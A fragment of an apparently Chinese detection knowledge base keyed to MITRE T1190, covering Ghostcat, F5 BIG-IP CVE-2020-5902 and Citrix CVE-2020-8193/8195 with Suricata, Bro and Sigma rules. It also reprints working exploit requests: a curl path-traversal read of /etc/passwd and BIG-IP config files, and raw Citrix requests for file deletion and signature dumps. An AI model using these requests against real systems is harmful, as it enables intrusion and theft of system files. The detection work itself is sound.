<p>https://www.cnblogs.com/potatsoSec/p/13895120.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/","title":"T1190-CVE-2020-1938\u6f0f\u6d1e\u5229\u7528\u68c0\u6d4b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#cve-2020-1938","title":"CVE-2020-1938\u6f0f\u6d1e","text":"<p>2\u670820\u65e5\uff0c\u56fd\u5bb6\u4fe1\u606f\u5b89\u5168\u6f0f\u6d1e\u5171\u4eab\u5e73\u53f0\uff08CNVD\uff09\u53d1\u5e03\u4e86Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CNVD-2020-10487/CVE-2020-1938\uff09\u3002\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eTomcat AJP\u534f\u8bae\u5b58\u5728\u7f3a\u9677\u800c\u5bfc\u81f4\uff0c\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\u53ef\u901a\u8fc7\u6784\u9020\u7279\u5b9a\u53c2\u6570\uff0c\u8bfb\u53d6\u670d\u52a1\u5668webapp\u4e0b\u7684\u4efb\u610f\u6587\u4ef6\u3002\u82e5\u76ee\u6807\u670d\u52a1\u5668\u540c\u65f6\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\uff0c\u653b\u51fb\u8005\u53ef\u8fdb\u4e00\u6b65\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002\u76ee\u524d\uff0c\u5382\u5546\u5df2\u53d1\u5e03\u65b0\u7248\u672c\u5b8c\u6210\u6f0f\u6d1e\u4fee\u590d\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5177\u4f53\u590d\u6d4b\u53ef\u4ee5\u53c2\u8003</p> <ul> <li>Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938) \u5206\u6790\uff1ahttps://www.secrss.com/articles/17267</li> </ul>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP\u6d41\u91cf</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u53ef\u53c2\u8003\u4e0a\u8ff0\u6d4b\u8bd5\u6848\u4f8b</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>HTTP\u6d41\u91cf\u68c0\u6d4b\u89c4\u5219\u57fa\u4e8epayload\u5173\u952e\u8bcd\u8fdb\u884c\u68c0\u6d4b</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#suricata","title":"Suricata\u68c0\u6d4b\u89c4\u5219","text":"<pre><code># CNVD-2020-10487 CVE-2020-1938\nalert tcp any any -&gt; any 8009 (msg:\"CNVD-2020-10487 Ghostcat\"; content:\"javax|2e|servlet|2e|include|2e|request_uri\"; content:\"javax|2e|servlet|2e|include|2e|path_info\"; content:\"javax|2e|servlet|2e|include|2e|servlet_path\"; reference:url,www.anquanke.com/post/id/199351; classtype:tomcat; sid:202002211; rev:1;)\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#bro","title":"Bro\u68c0\u6d4b\u89c4\u5219","text":"<pre><code>module EXPLOIT;\n\nevent tcp_packet(c: connection, is_orig: bool, flags: string, seq: count, ack: count, len: count, payload: string)\n{\n    if ( (c$id$resp_p == 8009/tcp) &amp;&amp; /javax\\.servlet\\.include\\.request_uri/ in payload &amp;&amp; /javax\\.servlet\\.include\\.path_info/ in payload &amp;&amp; /javax\\.servlet\\.include\\.servlet_path/ in payload)\n    {\n        local rec: EXPLOIT::Info = [$ts=c$start_time,\n                                    $src_ip=c$id$orig_h,\n                                    $src_port=c$id$orig_p,\n                                    $dst_ip=c$id$resp_h,\n                                    $dst_port=c$id$resp_p,\n                                    $vul_payload=payload,\n                                    $vul_describe=\"CVE-2020-1938 Ghostcat\",\n                                    $vul_refer=\"https://www.anquanke.com/post/id/199351\",\n                                    $vul_level=\"high\"];\n        Log::write(EXPLOIT::LOG, rec);\n    }\n</code></pre> <p>\u68c0\u6d4b\u89c4\u5219\u8f6c\u8f7d\u81ea\uff1ahttps://github.com/DaemonShao/CVE-2020-1938</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-1938-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>CVE-2020-1938\u68c0\u6d4b\u89c4\u5219</p> <p>https://github.com/DaemonShao/CVE-2020-1938</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"T1190-CVE-2020-5902-F5_BIG-IP-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>F5 BIG-IP \u662f\u7f8e\u56fdF5\u516c\u53f8\u4e00\u6b3e\u96c6\u6210\u6d41\u91cf\u7ba1\u7406\u3001DNS\u3001\u51fa\u5165\u7ad9\u89c4\u5219\u3001web\u5e94\u7528\u9632\u706b\u5899\u3001web\u7f51\u5173\u3001\u8d1f\u8f7d\u5747\u8861\u7b49\u529f\u80fd\u7684\u5e94\u7528\u4ea4\u4ed8\u5e73\u53f0\u3002\u5728 F5 BIG-IP \u4ea7\u54c1\u7684\u6d41\u91cf\u7ba1\u7406\u7528\u6237\u9875\u9762 (TMUI)/\u914d\u7f6e\u5b9e\u7528\u7a0b\u5e8f\u7684\u7279\u5b9a\u9875\u9762\u4e2d\u5b58\u5728\u4e00\u5904\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002</p> <p>\u672a\u6388\u6743\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u901a\u8fc7\u5411\u8be5\u9875\u9762\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5305\uff0c\u53ef\u4ee5\u9020\u6210\u4efb\u610fJava \u4ee3\u7801\u6267\u884c\u3002\u8fdb\u800c\u63a7\u5236 F5 BIG-IP \u7684\u5168\u90e8\u529f\u80fd\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e: \u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3001\u5f00\u542f/\u7981\u7528\u670d\u52a1\u3001\u521b\u5efa/\u5220\u9664\u670d\u52a1\u5668\u7aef\u6587\u4ef6\u7b49\u3002</p> <p>\u6f0f\u6d1e\u5f71\u54cd\u8303\u56f4\uff1a</p> <p>11.6.x, 12.1.x, 13.1.x, 14.1.x, 15.0.x, 15.1.x</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\uff1a</p> <p>F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-5902\uff09 \u6f0f\u6d1e\u5229\u7528</p> <p>https://blog.csdn.net/wuyou1995/article/details/107170186/</p> <p>cve-2020-5902 RCE\u7684payload\u4ee5\u53ca\u7ed5\u8fc7\u65b9\u5f0f</p> <p>https://www.cnblogs.com/potatsoSec/p/13263806.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5\u3002\u76f4\u63a5\u5f15\u7528\u6f0f\u6d1e\u5229\u7528\u5efa\u8bae\u53c2\u8003\u4e2d\u7684\u6848\u4f8b\u6570\u636e\u8fdb\u884c\u7279\u5f81\u63d0\u53d6\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"\u6587\u4ef6\u8bfb\u53d6POC","text":"<pre><code>curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'\n\nhttps://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\n\nhttps://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts\n\nhttps://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license\n\nhttps://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#javawafpayload","title":"\u901a\u8fc7java\u53cd\u5e8f\u5217\u5316\u7ed5\u8fc7waf\u7684payload","text":"<pre><code>String dburl = \"jdbc:hsqldb:https://\" + server +\n                               \":443/tmui/login.jsp/..%3b/hsqldb/\"; #\u622a\u53d6\u90e8\u5206\u5185\u5bb9\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: CVE-2020-5902 F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\nstatus: experimental\nreferences:\n    - https://blog.csdn.net/wuyou1995/article/details/107170186/\n    - https://www.cnblogs.com/potatsoSec/p/13263806.html\nauthor: Florian Roth\ntranslator: 12306Bro\ndate: 2020/07/05\nlogsource:\n    category: webserver\ndetection:\n    selection_base:\n        c-uri|contains: \n            - '/tmui/'\n            - '/hsqldb'\n    selection_traversal:\n        c-uri|contains:\n            - '..;/'\n            - '.jsp/..'\n    condition: selection_base and selection_traversal\nfields:\n    - c-ip\n    - c-dns\nfalsepositives:\n    - Unknown\ntags:\n    - attack.initial_access\n    - attack.t1190\nlevel: critical\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","title":"\u5efa\u8bae","text":"<p>\u5efa\u8bae\u4f7f\u7528HTTP\u6d41\u91cf+\u5b89\u5168\u8bbe\u5907\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u5224\u65ad\u653b\u51fb\u662f\u5426\u6210\u529f\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-5902-F5_BIG-IP_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1190</p> <p>https://attack.mitre.org/techniques/T1190/</p> <p>F5 BIG-IP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff08CVE-2020-5902\uff09 \u6f0f\u6d1e\u5229\u7528</p> <p>https://blog.csdn.net/wuyou1995/article/details/107170186/</p> <p>cve-2020-5902 RCE\u7684payload\u4ee5\u53ca\u7ed5\u8fc7\u65b9\u5f0f</p> <p>https://www.cnblogs.com/potatsoSec/p/13263806.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/","title":"T1190-CVE-2020-8193/CVE-2020-8195","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002</p> <p>\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002</p> <p>\u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Citrix Systems Citrix Application Delivery Controller\uff08ADC\uff09\u7b49\u90fd\u662f\u7f8e\u56fd\u601d\u6770\u7cfb\u7edf\uff08Citrix Systems\uff09\u516c\u53f8\u7684\u4ea7\u54c1\u3002Citrix Application Delivery Controller\u662f\u4e00\u6b3e\u5e94\u7528\u4ea4\u4ed8\u63a7\u5236\u5668\u3002Citrix Systems Gateway\uff08Citrix Systems NetScaler Gateway\uff09\u662f\u4e00\u5957\u5b89\u5168\u7684\u8fdc\u7a0b\u63a5\u5165\u89e3\u51b3\u65b9\u6848\u3002Citrix System SDWAN WAN-OP\u662f\u4e00\u6b3eSD-WAN\uff08\u865a\u62df\u8f6f\u4ef6\u5b9a\u4e49\u7684\u5e7f\u57df\u7f51\uff09\u8bbe\u5907\u3002Citrix Systems Citrix ADC\u3001Citrix Gateway\u548cCitrix SDWAN WAN-OP\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u7ed5\u8fc7\u6743\u9650\u9650\u5236\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP.log</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6f0f\u6d1e\u5229\u7528\u65b9\u5f0f\u5efa\u8bae\u53c2\u8003\uff1a</p> <p>Citrix Systems\u4ea7\u54c1\u5b89\u5168\u6f0f\u6d1e CVE-2020-8193, CVE-2020-8195 and CVE-2020-8196 poc</p> <p>https://www.cnblogs.com/potatsoSec/p/13281577.html</p> <p>Citrix\u5b89\u5168\u7814\u7a76\u5386\u9669\u8bb0</p> <p>https://blog.unauthorizedaccess.nl/2020/07/07/adventures-in-citrix-security-research.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\u5b9e\u6d4b\uff0c\u622a\u53d6\u90e8\u5206\u516c\u5f00\u8d44\u6599\u5185\u5bb9\u4f5c\u4e3a\u7559\u75d5\u6570\u636e\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_5","title":"\u5220\u9664\u6587\u4ef6","text":"<pre><code>POST /rapi/filedownload?filter=remove:1,path:%2ftmp%2ftest HTTP/1.1 \nHost: citrix.local\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://citrix.local/menu/neo\nIf-Modified-Since: Thu, 01 Jan 1970 05:30:00 GMT\nrand_key: 2061490565.1580290269373855\nDNT: 1\nX-NITRO-USER: henk\nX-NITRO-PASS: henk\nConnection: close\nCookie: startupapp=neo; is_cisco_platform=0; st_splitter=350px; rdx_pagination_size=25%20Per%20Page; SESSID=05afba59ef8e0e35933f3bc266941337\nContent-Type: application/xml\nContent-Length: 31\n\n&lt;clipermission&gt;&lt;/clipermission&gt;\n</code></pre> <p>\u4ee5\u4e0a\u5185\u5bb9\u622a\u53d6\u81eahttps://www.cnblogs.com/potatsoSec/p/13281577.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_6","title":"\u83b7\u53d6\u9ed8\u8ba4\u6240\u6709\u7b7e\u540d","text":"<pre><code>POST /pcidss/report?type=all_signatures&amp;sid=254&amp;username=nsroot&amp;profile_name=default&amp;set=0&amp;sig_name=_default_signature_&amp;sig_start_no=1 HTTP/1.1\nHost: citrix.local\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://citrix.local/pcidss/launch_report?type=main\nContent-Type: application/xml\nContent-Length: 0\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\n</code></pre> <p>\u4ee5\u4e0a\u5185\u5bb9\u622a\u53d6\u81eahttps://blog.unauthorizedaccess.nl/2020/07/07/adventures-in-citrix-security-research.html</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-CVE-2020-8193-CVE-2020-8195/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4b\u53ef\u7591\u7684CVE-2020-8193/CVE-2020-8195\nreferences:\n   